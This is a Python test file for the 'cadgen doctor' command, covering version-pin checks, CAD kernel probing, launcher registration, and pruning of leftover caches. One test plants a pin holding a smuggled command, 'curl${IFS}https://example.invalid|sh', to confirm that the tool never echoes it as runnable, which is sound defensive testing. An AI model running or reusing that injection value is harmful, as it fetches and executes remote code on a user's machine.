"""``cadgen doctor`` — the one user-facing pin/version check the skills teach.

The per-verb shims that used to enforce the pin on every invocation are gone;
doctor re-homes that value as an explicit command, so its contract is pinned here:
report the install, resolve a SKILL.md from a file/dir/cwd, exit 0 on
match-or-nothing-to-check, exit 3 (the historical shim code) on a mismatch, and
exit 4 when the CAD kernel is installed but cannot be loaded -- naming Smart App
Control on Windows, where a refused ``OCP`` load is otherwise a bare
ImportError. A kernel that is simply absent is reported and exits 0: the release
workflow installs the wheel --no-deps and runs doctor as its smoke test.

The kernel probe is a fresh-interpreter ``import OCP``; it is stubbed here so
the contract tests cost no kernel load, and exercised once for real.
"""

from __future__ import annotations

import io
import os
import sys
import unittest
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path
from tempfile import TemporaryDirectory
from unittest import mock

from tests.python.support.paths import add_repo_path

add_repo_path("packages/cadgen/src")

import cadgen  # noqa: E402
from cadgen.cli import doctor  # noqa: E402


def _run(argv: list[str]) -> tuple[int, str, str]:
    out, err = io.StringIO(), io.StringIO()
    with redirect_stdout(out), redirect_stderr(err):
        code = doctor.main(argv)
    return code, out.getvalue(), err.getvalue()


REFUSED = "ImportError: DLL load failed while importing OCP: Access is denied."


def skill_text(version: str) -> str:
    """A SKILL.md whose launch command pins ``version``, as the release stamps one."""
    return f"- `cadgen` means `uvx --no-config --managed-python --python 3.13 --from cadgen=={version} cadgen`\n"


class DoctorTests(unittest.TestCase):
    def setUp(self) -> None:
        patcher = mock.patch.object(doctor, "_probe_kernel", return_value=(doctor.KERNEL_OK, "/site/OCP.pyd"))
        patcher.start()
        self.addCleanup(patcher.stop)
        # The report reads what CAD's apps share from the state directory: a fresh one, never this machine's.
        state = TemporaryDirectory()
        self.addCleanup(state.cleanup)
        self.state = Path(state.name)
        # A plugin's install outside CI, where telemetry's default holds.
        environment = mock.patch.dict("os.environ", {"CADGEN_STATE_DIR": state.name, "DO_NOT_TRACK": "", "CADGEN_TELEMETRY": "",
                                                     "CADGEN_INSTALL_CHANNEL": "claude-github", "CI": "",
                                                     # The cadgen command goes to a folder of the test's, never ~/.local/bin.
                                                     "CADGEN_LAUNCHER_DIR": str(self.state / "bin"),
                                                     "PATH": str(self.state / "unrelated-bin"),
                                                     "CADGEN_INSTALLATION_VERSION": "",
                                                     # And no engine starts: a private folder, in a shell
                                                     # whose sandbox refuses one (`engine_host.SANDBOXES`).
                                                     "CADGEN_ENGINE_DIR": str(self.state / "engine"),
                                                     "CODEX_SANDBOX_NETWORK_DISABLED": "1"})
        environment.start()
        self.addCleanup(environment.stop)

    def test_the_report_registers_and_writes_the_command_and_says_so(self) -> None:
        from cadgen._internal import installations

        env = self.state / "env"
        env.mkdir()
        found = tuple(str(env / name) for name in ("cadgen.exe" if installations.WINDOWS else "cadgen", "python", ""))
        for path in found[:2]:
            Path(path).write_text("", encoding="utf-8")
        record = self.state / "installations" / "1.2.3-dev.1.json"
        command = installations.proxy_path(str(self.state / "bin"))
        with TemporaryDirectory() as tmp, mock.patch.object(installations, "targets", return_value=found), \
                mock.patch.dict("os.environ", {"CADGEN_INSTALLATION_VERSION": "1.2.3-dev.1"}):
            _, out, _ = _run([tmp])
            again = _run([tmp])[1]
            with mock.patch.dict("os.environ", {"PATH": os.pathsep.join([os.path.dirname(command),
                                                                         os.environ.get("PATH", "")])}):
                on_path = _run([tmp])[1]
            for path in found[:2]:
                Path(path).unlink()
            gone = _run([tmp])[1]
            pruned = _run(["--prune"])[1]
        self.assertIn(f"registry {record} registered\n", out)
        # Its folder off PATH: the full path to run it by, until the folder is on it.
        folder = os.path.dirname(command)
        self.assertIn(f"command  {command} written (was missing); run it as `{command}` until `{folder}` is on "
                      "your PATH\n", out)
        self.assertIn(f"registry {record} OK\n", again)
        self.assertIn(f"command  {command} OK; run it as `{command}` until `{folder}` is on your PATH\n", again)
        self.assertIn(f"command  {command} OK\n", on_path, "on PATH: nothing more")
        with mock.patch.dict("os.environ", {"HOME": str(self.state), "USERPROFILE": str(self.state)}):
            self.assertEqual(doctor._home(folder), os.path.join("~", "bin"))
        self.assertIn(f"registry {record} dangling: its interpreter {found[1]} is gone", gone)
        self.assertEqual(pruned, f"removed {record}\n")
        self.assertFalse(record.exists())

    def test_the_report_warns_when_another_cadgen_shadows_the_proxy(self) -> None:
        from cadgen._internal import installations

        command, _, error = installations.write_proxy()
        self.assertIsNone(error)
        venv = self.state / "project-venv" / "bin"
        venv.mkdir(parents=True)
        other = venv / ("cadgen.exe" if os.name == "nt" else "cadgen")
        other.write_text("not executed: PATH lookup only", encoding="utf-8")
        other.chmod(0o755)
        folder = str(Path(command).parent)
        for first, second, hint in (
            (str(venv), folder, f"; shadowed on PATH by `{other}`; run `{command}` explicitly"),
            (folder, str(venv), ""),
        ):
            with self.subTest(first=first), mock.patch.dict("os.environ", {"PATH": os.pathsep.join([first, second])}):
                code, out, err = _run(["--no-server", str(self.state)])
            self.assertEqual((code, err), (0, ""))
            # Windows PATH lookup can use PATHEXT's .EXE spelling for the fixture's .exe file.
            self.assertIn(os.path.normcase(f"command  {command} OK{hint}\n"), os.path.normcase(out))
        if os.name != "nt":
            other.chmod(0o644)  # an earlier non-executable file does not shadow the command
            with mock.patch.dict("os.environ", {"PATH": os.pathsep.join([str(venv), folder])}):
                self.assertIn(f"command  {command} OK\n", _run(["--no-server", str(self.state)])[1])

    def test_doctor_through_the_proxy_names_a_development_installation_by_its_version(self) -> None:
        """A development install run through the ``cadgen`` command, with nothing in its environment
        naming it: the proxy tells it, so its header and its record are its own version."""
        import subprocess

        from cadgen._internal import installations

        found = installations.targets()
        if found is None:
            self.skipTest("this interpreter has no console script to register")
        installations.register("1.2.3-dev.1", found)
        environment = {key: value for key, value in os.environ.items() if key != installations.NAME_ENV}
        environment["PYTHONPATH"] = str(Path(cadgen.__file__).resolve().parent.parent)  # this cadgen, however installed
        done = subprocess.run([sys.executable, "-P", "-m", "cadgen._internal.proxy", "+1.2.3-dev.1", "doctor",
                               "--no-server", str(self.state)], capture_output=True, text=True, env=environment,
                              timeout=300)
        self.assertEqual(done.returncode, 0, done.stderr)
        lines = done.stdout.splitlines()
        self.assertEqual(lines[0], "cadgen 1.2.3-dev.1")
        record = self.state / "installations" / "1.2.3-dev.1.json"
        self.assertEqual([line.strip() for line in lines if line.strip().startswith("registry")],
                         [f"registry {record} OK"])

    def test_a_development_installs_pin_is_the_version_it_runs_as(self) -> None:
        """A SKILL.md a development install wrote names `cadgen +<version>-dev.<time>`: OK for that
        installation, a mismatch for another."""
        with TemporaryDirectory() as tmp:
            skill = Path(tmp) / "SKILL.md"
            skill.write_text("- `cadgen` below means `cadgen +0.8.0-dev.20261025032333`\n", encoding="utf-8")
            with mock.patch.dict("os.environ", {"CADGEN_INSTALLATION_VERSION": "0.8.0-dev.20261025032333"}):
                code, out, _ = _run(["--no-server", tmp])
            self.assertEqual(code, 0, out)
            self.assertIn("pin      OK — cadgen==0.8.0-dev.20261025032333", out)
            with mock.patch.dict("os.environ", {"CADGEN_INSTALLATION_VERSION": "0.8.0-dev.1"}):
                code, _, err = _run(["--no-server", tmp])
            self.assertEqual(code, 3)
            self.assertIn("pins cadgen==0.8.0-dev.20261025032333, but cadgen 0.8.0-dev.1 is installed", err)

    @unittest.skipIf(os.name == "nt", "the legacy pair on POSIX: a symlink and an sh script")
    def test_prune_removes_the_per_version_launchers_earlier_builds_published(self) -> None:
        env = self.state / "env" / "bin"
        env.mkdir(parents=True)
        (env / "cadgen").write_text("", encoding="utf-8")
        (env / "python").write_text("", encoding="utf-8")
        folder = self.state / "bin"
        folder.mkdir()
        console, python = folder / "cadgen-0.8.0", folder / "cadgen-python-0.8.0"
        console.symlink_to(env / "cadgen")
        python.write_text(f"#!/bin/sh\n# cadgen launcher: {env / 'python'}\nexec '{env / 'python'}' \"$@\"\n",
                          encoding="utf-8")
        gone = folder / "cadgen-0.7.9"  # a dangling one, its environment removed since
        gone.symlink_to(self.state / "removed" / "bin" / "cadgen")
        kept = {folder / "cadgen": "#!/bin/sh\n# cadgen proxy: 1\n",  # the proxy itself
                folder / "cadgen-1.0": "another program's\n",
                folder / "cadgen-python-1.0": "#!/bin/sh\nexec python \"$@\"\n"}  # no marker: not ours
        for path, text in kept.items():
            path.write_text(text, encoding="utf-8")
        theirs = self.state / "theirs" / "bin"  # a person's own venv, registered nowhere
        theirs.mkdir(parents=True)
        (theirs / "cadgen").write_text("", encoding="utf-8")
        own = folder / "cadgen-0.7"
        own.symlink_to(theirs / "cadgen")
        code, out, _ = _run(["--prune"])
        self.assertEqual(code, 0)
        for path in (console, python, gone):
            self.assertIn(f"removed {path}, a launcher the cadgen command replaces\n", out)
            self.assertFalse(os.path.lexists(path), path)
        for path, text in kept.items():
            self.assertEqual(path.read_text(encoding="utf-8"), text, "anything else is left alone")
        self.assertTrue(os.path.islink(own), "a person's own cadgen-<v> into a venv of theirs is left alone")

    def test_a_source_tree_registers_nothing_unless_named(self) -> None:
        with TemporaryDirectory() as tmp:
            _, out, _ = _run([tmp])
        self.assertIn("registry not registered: a source tree registers only as a version it is named", out)
        self.assertFalse((self.state / "bin").exists())

    def test_the_report_says_what_cads_apps_share(self) -> None:
        with TemporaryDirectory() as tmp:
            _, out, _ = _run([tmp])
        self.assertIn("sharing  off: not until a cadgen command says so", out)
        # Told, and nothing chosen: on by default, from the day it was said.
        (self.state / "settings.json").write_text('{"telemetry": {"notifiedAt": 1790000000, "notice": 1}}', encoding="utf-8")
        with TemporaryDirectory() as tmp:
            _, out, _ = _run([tmp])
        self.assertRegex(out, r"sharing  on: by default, since cadgen said so on \d{4}-\d{2}-\d{2}\n")

    def test_the_report_starts_the_engine_when_none_runs(self) -> None:
        # In a sandbox that cannot start one, the client's own line, and nothing started.
        with TemporaryDirectory() as tmp:
            code, out, _ = _run([tmp])
        self.assertEqual(code, 0)
        self.assertRegex(out, r"server   not running \(.+\): no engine server is running, and this shell's sandbox cannot start one")
        self.assertFalse((self.state / "engine").exists(), "nothing started")
        # Running: said. None running: started, by the client's start (a request that may start one).
        # The workers counted as `cadgen status` counts them: the standby with them, against the cap.
        # And the version it runs as, so a stale engine is seen (one that says none: its release).
        answer = {"pid": 4242, "workers": [{"script": "a.py"}], "standby": {"pid": 4343}, "cap": 10,
                  "version": "0.8.0", "installation": "0.8.0-dev.2"}
        with TemporaryDirectory() as tmp, mock.patch("cadgen.engine.client.request", return_value=answer):
            _, out, _ = _run([tmp])
        self.assertRegex(out, r"server   running, pid 4242, cadgen 0\.8\.0-dev\.2, workers 2/10 with the standby \(.+\)\n")
        with TemporaryDirectory() as tmp, mock.patch("cadgen.engine.client.request",
                                                     return_value={**answer, "installation": None}):
            self.assertRegex(_run([tmp])[1], r"server   running, pid 4242, cadgen 0\.8\.0, workers 2/10")
        from cadgen.engine.cli import status_text

        self.assertIn(" · workers 2/10 with the standby · ", status_text({**answer, "up": 1}))
        answer = {"pid": 4242, "workers": [{"script": "a.py"}, {"script": "b.py"}], "standby": None, "cap": 10,
                  "installation": "0.8.0-dev.2"}
        with TemporaryDirectory() as tmp, mock.patch("cadgen.engine.client.request", side_effect=[None, answer]) as asked:
            _, out, _ = _run([tmp])
        self.assertEqual([call.kwargs["start"] for call in asked.call_args_list], [False, True])
        self.assertRegex(out, r"server   started, pid 4242, cadgen 0\.8\.0-dev\.2, workers 2/10 \(.+\)\n")
        # --no-server: everything else, and the engine only asked about, never started.
        with TemporaryDirectory() as tmp, mock.patch("cadgen.engine.client.request", return_value=None) as asked:
            code, out, _ = _run(["--no-server", tmp])
        self.assertEqual((code, [call.kwargs["start"] for call in asked.call_args_list]), (0, [False]))
        self.assertRegex(out, r"server   not running \(.+\); a build starts it outside a sandbox; inside one, "
                              r"run `cadgen server` outside first\n")

    def test_the_report_names_the_kernel_it_loaded(self) -> None:
        with TemporaryDirectory() as tmp:
            code, out, _ = _run([tmp])
        self.assertEqual(code, 0)
        self.assertIn("kernel   OK", out)
        self.assertIn("/site/OCP.pyd", out)

    def test_a_missing_kernel_is_reported_and_is_not_a_failure(self) -> None:
        # The release workflow installs the wheel --no-deps and runs doctor: no OCP
        # there is a correct install, and the pin is what brings the kernel.
        missing = "ModuleNotFoundError: No module named 'OCP'"
        with mock.patch.object(doctor, "_probe_kernel", return_value=(doctor.KERNEL_MISSING, missing)), \
                TemporaryDirectory() as tmp:
            code, out, err = _run([tmp])
        self.assertEqual(code, 0)
        self.assertIn("kernel   not installed", out)
        self.assertIn("uvx --no-config", out, "the launch command is what brings the kernel")
        self.assertNotIn("FAILED", err)

    def test_a_kernel_that_will_not_load_exits_4(self) -> None:
        with mock.patch.object(doctor, "_probe_kernel", return_value=(doctor.KERNEL_FAILED, REFUSED)), \
                mock.patch.object(sys, "platform", "linux"), TemporaryDirectory() as tmp:
            code, out, err = _run([tmp])
        self.assertEqual(code, 4)
        self.assertIn("kernel   FAILED", err)
        self.assertIn(REFUSED, err, "the exception line is the evidence")
        self.assertNotIn("Smart App Control", err, "off Windows the cause is not known")
        self.assertIn("pin      none found", out, "the rest of the report still prints")

    def test_a_refused_load_on_windows_names_smart_app_control(self) -> None:
        with mock.patch.object(doctor, "_probe_kernel", return_value=(doctor.KERNEL_FAILED, REFUSED)), \
                mock.patch.object(sys, "platform", "win32"), TemporaryDirectory() as tmp:
            code, _, err = _run([tmp])
        self.assertEqual(code, 4)
        self.assertIn("Smart App Control", err)
        self.assertIn("3077", err)

    def test_a_pin_mismatch_outranks_the_kernel(self) -> None:
        # The install is wrong before the kernel is: fixing the pin may fix both.
        with mock.patch.object(doctor, "_probe_kernel", return_value=(doctor.KERNEL_FAILED, REFUSED)), \
                TemporaryDirectory() as tmp:
            (Path(tmp) / "SKILL.md").write_text(skill_text("0.0.0.dev0"), encoding="utf-8")
            code, _, err = _run([tmp])
        self.assertEqual(code, 3)
        self.assertIn("kernel   FAILED", err)
        self.assertIn("MISMATCH", err)

    def test_matching_pin_passes_and_names_the_file(self) -> None:
        with TemporaryDirectory() as tmp:
            skill = Path(tmp) / "SKILL.md"
            skill.write_text(skill_text(cadgen.__version__), encoding="utf-8")
            code, out, _ = _run([str(skill)])
        self.assertEqual(code, 0)
        self.assertIn("OK", out)
        self.assertIn(str(skill), out)

    def mismatch(self, editable: str | None) -> tuple[int, str]:
        with mock.patch.object(doctor, "_editable_source", return_value=editable), \
                TemporaryDirectory() as tmp:
            (Path(tmp) / "SKILL.md").write_text(skill_text("0.0.0.dev0"), encoding="utf-8")
            code, _, err = _run([tmp])
        return code, err

    def test_mismatch_exits_3_with_the_install_instruction(self) -> None:
        code, err = self.mismatch(None)
        self.assertEqual(code, 3)
        self.assertIn("MISMATCH", err)
        self.assertIn("--from cadgen==0.0.0.dev0 cadgen", err, "the skill's own launch command runs its pin")

    def test_a_pin_that_is_no_version_is_never_printed_as_a_command(self) -> None:
        # A SKILL.md in a downloaded project, run from: its "pin" is a shell command.
        with mock.patch.object(doctor, "_editable_source", return_value=None), TemporaryDirectory() as tmp:
            (Path(tmp) / "SKILL.md").write_text(skill_text("0.8.0;curl${IFS}https://example.invalid|sh"), encoding="utf-8")
            code, _, err = _run([tmp])
        self.assertEqual(code, 3)
        self.assertIn("pins no cadgen version", err)
        self.assertNotIn("uvx", err)

    def test_an_editable_install_is_told_to_re_record_itself_not_to_replace_itself(self) -> None:
        # An editable install's version is a snapshot taken when it was
        # installed, so its code can already BE the pinned version while the
        # metadata is behind. The skill's launch command would run a published
        # release instead of the source tree -- the wrong fix.
        source = str(Path("/src/packages/cadgen"))
        code, err = self.mismatch(source)
        self.assertEqual(code, 3)
        self.assertIn("MISMATCH", err)
        self.assertIn("EDITABLE", err)
        self.assertIn(f"pip install -e {source}", err)
        self.assertIn("recorded when", err, "the report says WHY the version is stale")
        self.assertNotIn("--from cadgen==", err)

    def test_an_editable_source_is_read_off_this_install(self) -> None:
        # In a checkout cadgen IS editable; a wheel install records no
        # direct_url.json at all. Either answer is correct, and neither may
        # raise -- a doctor that crashes reporting a mismatch is worse than the
        # mismatch.
        source = doctor._editable_source()
        if source is not None:
            self.assertTrue(Path(source).is_dir(), source)

    def test_an_unreadable_direct_url_record_is_not_editable(self) -> None:
        class Record:
            def __init__(self, text: str | None) -> None:
                self.text = text

            def read_text(self, _name: str) -> str | None:
                return self.text

        for text in (None, "", "{not json", "[]", '{"url": "file:///s"}', '{"dir_info": {}}'):
            with self.subTest(text=text):
                with mock.patch("importlib.metadata.distribution", return_value=Record(text)):
                    self.assertIsNone(doctor._editable_source())


class PrivateFolders(unittest.TestCase):
    """A state, cache, engine and launcher folder of the test's own, and files in them written a month ago."""

    OLD = 30 * 86400

    def setUp(self) -> None:
        patcher = mock.patch.object(doctor, "_probe_kernel", return_value=(doctor.KERNEL_OK, "/site/OCP.pyd"))
        patcher.start()
        self.addCleanup(patcher.stop)
        root = TemporaryDirectory()
        self.addCleanup(root.cleanup)
        self.root = Path(root.name).resolve()
        self.state, self.cache, self.engines = self.root / "state", self.root / "cache", self.root / "engine"
        self.engines.mkdir(mode=0o700)
        environment = mock.patch.dict("os.environ", {"CADGEN_STATE_DIR": str(self.state), "CADGEN_CACHE_DIR": str(self.cache),
                                                     "CADGEN_LAUNCHER_DIR": str(self.root / "bin"),
                                                     "CADGEN_ENGINE_DIR": str(self.engines),
                                                     "CADGEN_INSTALLATION_VERSION": "", "DO_NOT_TRACK": "1",
                                                     "CODEX_SANDBOX_NETWORK_DISABLED": "1"})
        environment.start()
        self.addCleanup(environment.stop)

    def file(self, inside: str, data: str = "x", *, old: bool = True) -> Path:
        path = self.root / inside
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(data, encoding="utf-8")
        if old:
            self.age(path)
        return path

    def age(self, path: Path) -> None:
        """``path`` and everything up to the test's folder, last written a month ago."""
        import time

        then = time.time() - self.OLD
        while path != self.root:
            os.utime(path, (then, then))
            path = path.parent

    def mirror(self, environment: Path) -> str:
        """Where Python files the bytecode of a library in ``environment`` under a pycache prefix."""
        return os.path.splitdrive(str(environment / "lib" / "site.py"))[1].lstrip("\\/")

    def tree(self) -> list[str]:
        return sorted(path.relative_to(self.root).as_posix() for folder in (self.state / "engines", self.state / "documents",
                                                                         self.cache) for path in folder.rglob("*"))



class LeftoversTest(PrivateFolders):
    """``cadgen doctor`` says what cadgen left behind that nothing needs, and ``--prune`` removes it, a
    line per kind: never a live engine's bytecode, a registered installation's, a recorded document's
    cache, nor anything written in the last seven days."""

    def test_doctor_says_what_nothing_needs_and_prune_removes_it_but_what_is_live_registered_recorded_or_recent(self) -> None:
        import json

        from cadgen._internal import installations
        from cadgen.engine import daemon

        self.file("state/engines/aaaaaaaa.json", json.dumps({"schema": 2, "token": "an-earlier-builds"}))
        trimmed = self.file("state/engines/bbbbbbbb.json", json.dumps({"schema": 3, "port": 3246, "token": "t" * 43}))
        current = self.file("state/engines/cccccccc.json", json.dumps({"port": 3247, "schema": 3}))
        recent_record = self.file("state/engines/dddddddd.json", json.dumps({"schema": 1}), old=False)
        token = self.file("state/engines/token", "t" * 43)
        # A registered installation, alive: its python and console script are there.
        environment = self.root / "env"
        for name in ("python", "cadgen"):
            self.file(f"env/bin/{name}")
        record = {"version": "1.0.0", "python": str(environment / "bin" / "python"),
                  "cadgen": str(environment / "bin" / "cadgen"), "prefix": str(environment)}
        self.file("state/installations/1.0.0.json", json.dumps(record))
        registered = self.file(f"cache/pycache/aaaaaaaaaaaa/{self.mirror(environment)}/x.pyc").parents[0]
        self.file(f"cache/pycache/bbbbbbbbbbbb/{self.mirror(self.root / 'uninstalled')}/x.pyc", "y" * 2048)
        live = self.file(f"cache/pycache/cccccccccccc/{self.mirror(self.root / 'editable')}/x.pyc")
        held = daemon.lock(self.engines / "cccccccccccc.lock")  # its engine runs
        self.addCleanup(held.close)
        recent_bytecode = self.file(f"cache/pycache/dddddddddddd/{self.mirror(self.root / 'other')}/x.pyc", old=False)
        recorded, forgotten, fresh = ("11111111-1111-5111-8111-111111111111", "22222222-2222-5222-8222-222222222222",
                                      "33333333-3333-5333-8333-333333333333")
        self.file(f"state/documents/{recorded}/document.json", "{}")
        self.file(f"cache/documents/{recorded}/document.xbf")
        self.file(f"cache/documents/{forgotten}/document.xbf", "z" * 4096)
        self.file(f"cache/documents/{fresh}/document.xbf", old=False)
        self.file("cache/documents/not-a-document/notes.txt")
        stamp = self.file("state/telemetry-sender", "")  # an earlier 0.8 build's sender's start
        before = self.tree()

        with mock.patch.object(installations, "targets", return_value=None):
            code, out, _ = _run(["--no-server", str(self.root)])
        self.assertEqual(code, 0)
        self.assertIn("  leftover 2 engine records of an older format, 1 bytecode folder of installations no longer "
                      "registered (2.0 KB), 1 cache folder with no record (4.0 KB), 1 file an earlier 0.8 build kept "
                      "(telemetry-sender): cadgen doctor --prune removes them\n", out)
        self.assertEqual(self.tree(), before, "nothing is removed without --prune")
        self.assertIn(f"  cache    {self.cache}: 1 document · 1 B, kept until deleted\n", out,
                      "the documents the cache keeps, each a record names, with no cap")

        code, out, _ = _run(["--prune"])
        self.assertEqual(code, 0)
        self.assertEqual(out, "no registered installation has lost its interpreter\n"
                              "removed 1 engine record of an older format\n"
                              "removed the page token 1 engine record still carried (the port each rolled to is kept)\n"
                              "removed 1 bytecode folder of installations no longer registered (2.0 KB)\n"
                              "removed 1 cache folder with no record (4.0 KB)\n"
                              f"removed {stamp}, a file an earlier 0.8 build kept\n")
        self.assertFalse((self.state / "engines" / "aaaaaaaa.json").exists())
        self.assertEqual(json.loads(trimmed.read_text(encoding="utf-8")), {"port": 3246, "schema": 3})
        for kept in (current, recent_record, token, registered, live, recent_bytecode,
                     self.cache / "documents" / recorded / "document.xbf", self.cache / "documents" / fresh,
                     self.cache / "documents" / "not-a-document"):
            self.assertTrue(kept.exists(), kept)
        self.assertFalse((self.cache / "pycache" / "bbbbbbbbbbbb").exists())
        self.assertFalse((self.cache / "documents" / forgotten).exists())
        code, out, _ = _run(["--prune"])
        self.assertEqual(out, "no registered installation has lost its interpreter\n", "nothing is left to remove")


class SevenLeftoversTest(PrivateFolders):
    """cadgen 0.7's store and state files retire themselves: ``cadgen doctor`` says they are there,
    ``--prune`` removes them once nothing has written them for seven days, ``--all-versions`` at
    once; a folder of that name that is not 0.7's store, and 0.8's own files, are never touched."""

    def seven(self, *, recent: str | None = None) -> list[Path]:
        made = [self.file("cache/objects/ab/" + "c" * 62, "o" * 4089), self.file("cache/index/model/" + "d" * 64, "{}"),
                self.file("state/sidebar-views/views.json", "[]"), self.file("state/snapshot-browser.lock", ""),
                self.file("state/recents/recents.jsonl", "{}\n"), self.file("state/install-channels.json.lock", "")]
        if recent:
            made.append(self.file(recent, "written now", old=False))
        return made

    def ours(self) -> list[Path]:
        """0.8's own files beside 0.7's, which nothing here touches."""
        return [self.file("state/settings.json", "{}"), self.file("state/settings.lock", ""),
                self.file("state/install-channels.json", "{}"), self.file("state/recents/thumbnails/" + "e" * 32 + ".png", "p"),
                self.file("cache/pycache/aaaaaaaaaaaa/x.pyc", old=False),
                self.file("cache/documents/11111111-1111-5111-8111-111111111111/document.xbf", old=False)]

    def last(self, paths: list[Path]) -> str:
        import time

        return time.strftime("%Y-%m-%d", time.localtime(max(os.lstat(path).st_mtime for path in paths)))

    def test_a_quiet_0_7_is_said_with_its_size_and_age_and_pruned(self) -> None:
        made, ours = self.seven(), self.ours()
        said = f"cadgen 0.7's store and 4 state files (4.0 KB), last written {self.last(made)}"
        code, out, _ = _run(["--no-server", str(self.root)])
        self.assertEqual(code, 0)
        self.assertIn(f"  0.7      {said}: cadgen doctor --prune removes it\n", out)
        self.assertTrue(all(path.exists() for path in made), "nothing is removed without --prune")
        code, out, _ = _run(["--prune"])
        self.assertEqual(out, f"no registered installation has lost its interpreter\nremoved {said}\n")
        for gone in ("cache/objects", "cache/index", "state/sidebar-views", "state/snapshot-browser.lock",
                     "state/recents/recents.jsonl", "state/install-channels.json.lock"):
            self.assertFalse((self.root / gone).exists(), gone)
        self.assertTrue(all(path.exists() for path in ours), "0.8's own files stay")
        self.assertNotIn("0.7", _run(["--no-server", str(self.root)])[1])

    def test_a_0_7_written_in_the_last_week_stays_until_all_versions_says_none_needs_it(self) -> None:
        made, ours = self.seven(recent="state/viewer.log"), self.ours()
        said = f"cadgen 0.7's store and 5 state files (4.0 KB), last written {self.last(made)}"
        code, out, _ = _run(["--no-server", str(self.root)])
        self.assertIn(f"  0.7      {said}: cadgen doctor --prune removes it once nothing has written it for 7 days, "
                      "or now with --all-versions\n", out)
        code, out, _ = _run(["--prune"])
        self.assertEqual(out, f"no registered installation has lost its interpreter\nkept {said}: a cadgen 0.7 still "
                              "installed may use it; it goes once nothing has written it for 7 days, or now with "
                              "--all-versions\n")
        self.assertTrue(all(path.exists() for path in made), "a 0.7 written this week may be in use")
        with redirect_stderr(io.StringIO()), self.assertRaises(SystemExit):
            doctor.main(["--all-versions"])  # with --prune alone
        code, out, _ = _run(["--prune", "--all-versions"])
        self.assertEqual(out, f"no registered installation has lost its interpreter\nremoved {said}\n")
        self.assertFalse(any(path.exists() for path in made))
        self.assertTrue(all(path.exists() for path in ours), "0.8's own files stay")

    def test_a_folder_of_the_store_s_name_that_is_not_0_7_s_store_is_left_alone(self) -> None:
        theirs = [self.file("cache/objects/notes.txt", "another program's"), self.file("cache/index/README", "")]
        code, out, _ = _run(["--prune", "--all-versions"])
        self.assertEqual(out, "no registered installation has lost its interpreter\n")
        self.assertTrue(all(path.exists() for path in theirs))


class KernelProbeTest(unittest.TestCase):
    """The real probe, once: this interpreter's kernel imports in a child."""

    def test_the_probe_imports_ocp_in_a_fresh_interpreter(self) -> None:
        state, detail = doctor._probe_kernel()
        self.assertEqual(state, doctor.KERNEL_OK, detail)
        self.assertIn("OCP", detail)

    def test_the_probe_imports_the_installed_kernel_whatever_folder_it_runs_from(self) -> None:
        import os

        with TemporaryDirectory() as folder:
            Path(folder, "OCP.py").write_text("raise SystemExit('the working folder was searched')\n", encoding="utf-8")
            here = os.getcwd()
            os.chdir(folder)
            try:
                state, detail = doctor._probe_kernel()
            finally:
                os.chdir(here)
        self.assertEqual(state, doctor.KERNEL_OK, detail)
        self.assertNotIn(os.path.realpath(folder), os.path.realpath(detail))

    def test_the_probe_tells_a_missing_kernel_from_a_refused_one(self) -> None:
        # The child interpreter's last stderr line is all the probe has. A
        # ModuleNotFoundError is "not installed" (a --no-deps wheel install, a
        # cadgen-free skill); anything else is the kernel refusing to load.
        import subprocess

        def child(stderr: str) -> subprocess.CompletedProcess:
            return subprocess.CompletedProcess(args=[], returncode=1, stdout="", stderr=stderr)

        missing = child("Traceback...\nModuleNotFoundError: No module named 'OCP'\n")
        with mock.patch("subprocess.run", return_value=missing):
            self.assertEqual(
                doctor._probe_kernel(),
                (doctor.KERNEL_MISSING, "ModuleNotFoundError: No module named 'OCP'"),
            )
        refused = child("ImportError: DLL load failed while importing OCP: Access is denied.\n")
        with mock.patch("subprocess.run", return_value=refused):
            state, detail = doctor._probe_kernel()
        self.assertEqual(doctor.KERNEL_FAILED, state)
        self.assertIn("DLL load failed", detail)


def setUpModule() -> None:
    # The registry and cache of every engine this module starts are its own, never the developer's
    # (``engine_daemon.isolate``); each test still names its own engine folder.
    from tests.python.support import engine_daemon

    engine_daemon.isolate(unittest.addModuleCleanup)


if __name__ == "__main__":
    unittest.main()
